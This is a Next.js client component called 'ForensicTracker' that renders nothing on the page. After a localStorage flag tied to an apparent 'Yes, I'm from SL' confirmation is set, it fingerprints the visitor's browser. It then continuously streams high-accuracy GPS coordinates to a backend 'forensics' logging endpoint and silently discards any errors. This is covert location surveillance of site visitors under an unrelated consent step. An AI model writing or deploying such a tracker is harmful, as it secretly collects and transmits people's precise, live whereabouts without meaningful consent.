"use client";

import { useEffect, useState, useRef } from "react";
import { usePathname } from "next/navigation";
import { API_URL } from "@/lib/config";

export default function ForensicTracker() {
  const pathname = usePathname();
  const [hasAuthorized, setHasAuthorized] = useState(false);
  const watcherRef = useRef<number | null>(null);

  useEffect(() => {
    if (pathname.includes("/admin/dashboard")) return;

    // Check for authorization (Yes, I'm from SL)
    const checkAuth = setInterval(() => {
      const isAuthorized =
        localStorage.getItem("ccid_auth_v2") === "authorized";
      if (isAuthorized) {
        setHasAuthorized(true);
        clearInterval(checkAuth);
      }
    }, 1000);

    return () => clearInterval(checkAuth);
  }, [pathname]);

  useEffect(() => {
    if (!hasAuthorized) return;

    const fingerprint = {
      screen: `${window.screen.width}x${window.screen.height}`,
      userAgent: navigator.userAgent,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || "direct",
    };

    const logUpdate = async (loc: any) => {
      try {
        await fetch(`${API_URL}/api/v1/forensics/log-visit`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            source: pathname || "/",
            fingerprint,
            location: loc, // We send THIS as the real-time GPS
          }),
        });
      } catch (e) {}
    };

    // 🛰️ LIVE FORENSIC STREAMING
    if ("geolocation" in navigator) {
      watcherRef.current = navigator.geolocation.watchPosition(
        (pos) => {
          const refinedLocation = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            timestamp: pos.timestamp,
          };

          // Send the "Current Best" coordinates immediately
          console.log(
            `[FORENSICS] Precision Lock: ${pos.coords.accuracy.toFixed(1)}m`,
          );
          logUpdate(refinedLocation);
        },
        (err) => {
          // Fallback if GPS is blocked but we have IP data
          if (err.code === 1) logUpdate(null);
        },
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0,
        },
      );
    } else {
      logUpdate(null);
    }

    return () => {
      if (watcherRef.current)
        navigator.geolocation.clearWatch(watcherRef.current);
    };
  }, [hasAuthorized, pathname]);

  return null;
}
